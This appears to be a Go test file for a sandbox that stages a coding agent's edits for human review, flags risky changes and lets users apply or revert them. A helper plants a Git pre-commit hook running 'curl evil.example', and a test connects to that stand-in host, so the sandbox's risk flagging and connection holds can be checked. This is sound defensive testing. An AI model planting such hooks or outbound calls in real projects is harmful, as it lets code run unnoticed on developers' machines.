package cabin

import (
	"context"
	"encoding/json"
	"errors"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// agentEdits 模拟 agent 在沙箱中的改动：修改源文件，新建 Git 钩子，安装一个依赖。
func (e *env) agentEdits(t *testing.T) {
	t.Helper()
	files := e.b.lastSpec(t).StagingDir
	writeFile(t, filepath.Join(files, "main.go"), "package main\n\nfunc main() {}\n")
	writeFile(t, filepath.Join(files, ".git/hooks/pre-commit"), "#!/bin/sh\ncurl evil.example\n")
	writeFile(t, filepath.Join(files, "node_modules/left/index.js"), "module.exports = 2\n")
}

func paths(items []ReviewItem) []string {
	var out []string
	for _, it := range items {
		out = append(out, it.Path)
	}
	return out
}

// AC-13：ReviewItems 合并改动和风险标注，不列出依赖目录。Revert 只在 Running 可用，Apply 只在 Review 可用。
func TestReviewDuringAndAfterRun(t *testing.T) {
	e := newEnv(t, nil, fakeInspector{})
	c := e.started(t, "claude-code")
	e.agentEdits(t)
	ctx := context.Background()

	items, err := e.m.ReviewItems(c.ID)
	if err != nil {
		t.Fatal(err)
	}
	if got := strings.Join(paths(items), ","); got != ".git/hooks/pre-commit,main.go" {
		t.Fatalf("ReviewItems = %s", got)
	}
	if f := items[0].Findings; len(f) != 1 || f[0].Kind != HighRisk {
		t.Fatalf("Git 钩子应该标为高风险：%+v", f)
	}
	// 没有风险标注时输出 []，不输出 null。
	if b, _ := json.Marshal(items[1]); !strings.Contains(string(b), `"findings":[]`) {
		t.Fatalf("JSON = %s", b)
	}
	if err := e.m.Apply(c.ID, "main.go"); err == nil {
		t.Fatal("运行中不能写回项目")
	}
	if err := e.m.Revert(c.ID, "node_modules/left/index.js"); err == nil {
		t.Fatal("依赖目录的改动不能撤销")
	}
	if err := e.m.Revert(c.ID, "no-such-file"); err == nil {
		t.Fatal("不在改动列表中的路径不能撤销")
	}
	if err := e.m.Revert(c.ID, ".git/hooks/pre-commit"); err != nil {
		t.Fatal(err)
	}

	if err := e.m.Stop(ctx, c.ID); err != nil {
		t.Fatal(err)
	}
	if err := e.m.Revert(c.ID, "main.go"); err == nil {
		t.Fatal("停止后不能撤销")
	}
	// 重启 Manager 后，Review 状态的暂存区仍然可以审查。
	m2, err := New(Options{DataDir: e.dataDir, Backend: e.b, Secret: e.m.o.Secret, Inspector: fakeInspector{}})
	if err != nil {
		t.Fatal(err)
	}
	items, err = m2.ReviewItems(c.ID)
	if err != nil || strings.Join(paths(items), ",") != "main.go" {
		t.Fatalf("重启后 ReviewItems = %+v, %v", items, err)
	}
	if err := m2.Apply(c.ID, "node_modules/left/index.js"); err == nil {
		t.Fatal("依赖目录的改动不能写回项目")
	}
	if err := m2.Apply(c.ID, "main.go"); err != nil {
		t.Fatal(err)
	}
	if data, _ := os.ReadFile(filepath.Join(c.Project, "main.go")); !strings.Contains(string(data), "func main") {
		t.Fatalf("项目文件没有更新：%q", data)
	}
	if _, err := os.Stat(filepath.Join(c.Project, ".git/hooks/pre-commit")); !os.IsNotExist(err) {
		t.Fatal("撤销的改动不能写入项目")
	}
	if data, _ := os.ReadFile(filepath.Join(c.Project, "node_modules/left/index.js")); string(data) != "module.exports = 1\n" {
		t.Fatalf("依赖目录不能被写回：%q", data)
	}
}

// Revert 和 Apply 也受忙标记保护，不会与 Stop、FinishReview 等操作同时进行。失败后不留下忙标记。
func TestRevertAndApplyRespectBusy(t *testing.T) {
	ctx := context.Background()
	e := newEnv(t, nil, nil)
	c := e.started(t, "claude-code")
	files := e.b.lastSpec(t).StagingDir
	writeFile(t, filepath.Join(files, "a.txt"), "a")
	writeFile(t, filepath.Join(files, "b.txt"), "b")
	setBusy := func() {
		e.m.mu.Lock()
		e.m.busy[c.ID] = true
		e.m.mu.Unlock()
	}

	setBusy()
	if err := e.m.Revert(c.ID, "a.txt"); err == nil || !strings.Contains(err.Error(), "正在处理") {
		t.Fatalf("忙的时候 Revert = %v", err)
	}
	e.m.end(c.ID)
	if err := e.m.Revert(c.ID, "no-such-file"); err == nil {
		t.Fatal("不在改动列表中的路径不能撤销")
	}
	if err := e.m.Revert(c.ID, "a.txt"); err != nil {
		t.Fatalf("失败的 Revert 留下了忙标记：%v", err)
	}
	if err := e.m.Stop(ctx, c.ID); err != nil {
		t.Fatal(err)
	}

	setBusy()
	if err := e.m.Apply(c.ID, "b.txt"); err == nil || !strings.Contains(err.Error(), "正在处理") {
		t.Fatalf("忙的时候 Apply = %v", err)
	}
	e.m.end(c.ID)
	if err := e.m.Apply(c.ID, "no-such-file"); err == nil {
		t.Fatal("不在改动列表中的路径不能写回")
	}
	if err := e.m.Apply(c.ID, "b.txt"); err != nil {
		t.Fatalf("失败的 Apply 留下了忙标记：%v", err)
	}
	if err := e.m.FinishReview(c.ID); err != nil {
		t.Fatalf("Apply 之后留下了忙标记：%v", err)
	}
}

func TestReviewItemsNeedsRun(t *testing.T) {
	e := newEnv(t, nil, nil)
	c := e.create(t, "claude-code")
	if _, err := e.m.ReviewItems(c.ID); err == nil {
		t.Fatal("空闲的工作舱没有改动")
	}
	if err := e.m.Revert(c.ID, "main.go"); err == nil {
		t.Fatal("空闲时不能撤销")
	}
	if err := e.m.Apply(c.ID, "main.go"); err == nil {
		t.Fatal("空闲时不能写回")
	}
}

// AC-14：FinishReview 为每个改动写入审查记录，丢弃暂存区，回到 Idle。Report 返回这次运行的报告。
func TestFinishReviewAndReport(t *testing.T) {
	e := newEnv(t, nil, fakeInspector{})
	c := e.started(t, "claude-code")
	if err := e.m.FinishReview(c.ID); err == nil {
		t.Fatal("运行中不能完成审查")
	}
	e.agentEdits(t)
	ctx := context.Background()
	e.m.Stop(ctx, c.ID)
	if err := e.m.Apply(c.ID, "main.go"); err != nil {
		t.Fatal(err)
	}
	if err := e.m.FinishReview(c.ID); err != nil {
		t.Fatal(err)
	}
	if e.status(t, c.ID) != Idle {
		t.Fatalf("状态 = %q", e.status(t, c.ID))
	}
	if _, err := os.Stat(e.m.areaDir(c.ID)); !os.IsNotExist(err) {
		t.Fatal("暂存区没有删除")
	}
	rep, err := e.m.Report(c.ID)
	if err != nil {
		t.Fatal(err)
	}
	applied := map[string]bool{}
	for _, f := range rep.Files {
		applied[f.Path] = f.Applied
	}
	// 依赖目录的改动不记录。
	if len(applied) != 2 || !applied["main.go"] || applied[".git/hooks/pre-commit"] {
		t.Fatalf("Files = %+v", rep.Files)
	}
	if err := e.m.FinishReview(c.ID); err == nil {
		t.Fatal("Idle 状态不能完成审查")
	}
	// 下一次运行从项目的最新内容开始。
	c = e.started(t, "claude-code")
	if items, _ := e.m.ReviewItems(c.ID); len(items) != 0 {
		t.Fatalf("新运行的改动 = %+v", items)
	}
}

func TestReportWithoutRun(t *testing.T) {
	e := newEnv(t, nil, nil)
	c := e.create(t, "claude-code")
	if _, err := e.m.Report(c.ID); err == nil {
		t.Fatal("没有运行过的工作舱没有报告")
	}
}

// AC-15：Reset 丢弃暂存区，删除缓存卷，不生成报告。Running 时先停止。
func TestReset(t *testing.T) {
	ctx := context.Background()
	for _, from := range []Status{Running, Review, Idle} {
		t.Run(string(from), func(t *testing.T) {
			e := newEnv(t, nil, nil)
			c := e.started(t, "claude-code")
			switch from {
			case Review:
				e.m.Stop(ctx, c.ID)
			case Idle:
				e.m.Stop(ctx, c.ID)
				e.m.FinishReview(c.ID)
			}
			removes := e.b.called("remove")
			if err := e.m.Reset(ctx, c.ID); err != nil {
				t.Fatal(err)
			}
			if from == Running && e.b.called("remove") != removes+1 {
				t.Fatal("Running 时 Reset 应该先停止")
			}
			if e.b.called("remove-cache:"+c.ID) != 1 {
				t.Fatalf("没有删除缓存卷：%q", e.b.calls)
			}
			got, _ := e.m.get(c.ID)
			if got.Status != Idle || got.RunID != "" {
				t.Fatalf("cabin = %+v", got)
			}
			if _, err := os.Stat(e.m.areaDir(c.ID)); !os.IsNotExist(err) {
				t.Fatal("暂存区没有删除")
			}
			if _, err := e.m.Report(c.ID); err == nil {
				t.Fatal("重置后不能有运行报告")
			}
		})
	}
}

// 删除缓存卷失败时状态不变，暂存区保留，可以再次重置。
func TestResetFailures(t *testing.T) {
	ctx := context.Background()
	e := newEnv(t, nil, nil)
	c := e.started(t, "claude-code")
	e.m.Stop(ctx, c.ID)
	e.b.cacheErr = errors.New("fake: 卷正在使用")
	if err := e.m.Reset(ctx, c.ID); err == nil {
		t.Fatal("Reset 应该失败")
	}
	if e.status(t, c.ID) != Review {
		t.Fatal("Reset 失败时状态不能改变")
	}
	if _, err := e.m.ReviewItems(c.ID); err != nil {
		t.Fatalf("Reset 失败时暂存区应该保留：%v", err)
	}

	e2 := newEnv(t, nil, nil)
	c2 := e2.started(t, "claude-code")
	e2.b.removeErr = errors.New("fake: Docker 没有响应")
	if err := e2.m.Reset(ctx, c2.ID); err == nil {
		t.Fatal("停止失败时 Reset 应该失败")
	}
	if e2.status(t, c2.ID) != Running || e2.b.called("remove-cache:"+c2.ID) != 0 {
		t.Fatal("停止失败时不能删除缓存卷")
	}

	// Running 时 Reset 已经停止了运行，之后删除缓存卷失败，工作舱停在 Review，再次 Reset 可以完成。
	e3 := newEnv(t, nil, nil)
	c3 := e3.started(t, "claude-code")
	e3.b.cacheErr = errors.New("fake: 卷正在使用")
	if err := e3.m.Reset(ctx, c3.ID); err == nil || e3.status(t, c3.ID) != Review {
		t.Fatalf("Reset = %v，状态 %q", err, e3.status(t, c3.ID))
	}
	e3.b.cacheErr = nil
	if err := e3.m.Reset(ctx, c3.ID); err != nil || e3.status(t, c3.ID) != Idle {
		t.Fatalf("再次 Reset = %v，状态 %q", err, e3.status(t, c3.ID))
	}
}

// AC-16：没有 Explainer 和 Inspector 时，全部流程仍然可用。
func TestWithoutExtensions(t *testing.T) {
	ctx := context.Background()
	e := newEnv(t, nil, nil)
	c := e.started(t, "claude-code")
	if entry, err := e.m.EntryFindings(c.ID); err != nil || entry == nil || len(entry) != 0 {
		t.Fatalf("EntryFindings = %+v, %v", entry, err)
	}
	// 没有 Inspector 时不排除文件。
	if _, err := os.Stat(filepath.Join(e.b.lastSpec(t).StagingDir, ".env")); err != nil {
		t.Fatal(".env 应该被复制")
	}
	connect(t, e.b.lastSpec(t).GatePort, "evil.example:443")
	h := e.next(t, "hold").Hold
	if h.Explanation.Source != "template" {
		t.Fatalf("hold = %+v", h)
	}
	e.m.Decide(h.ID, false)
	e.agentEdits(t)
	items, err := e.m.ReviewItems(c.ID)
	if err != nil || len(items) != 3 {
		t.Fatalf("ReviewItems = %+v, %v", items, err)
	}
	e.m.Stop(ctx, c.ID)
	for _, it := range items {
		if err := e.m.Apply(c.ID, it.Path); err != nil {
			t.Fatal(err)
		}
	}
	if err := e.m.FinishReview(c.ID); err != nil {
		t.Fatal(err)
	}
	if rep, err := e.m.Report(c.ID); err != nil || len(rep.Files) != 3 {
		t.Fatalf("Report = %+v, %v", rep, err)
	}
}
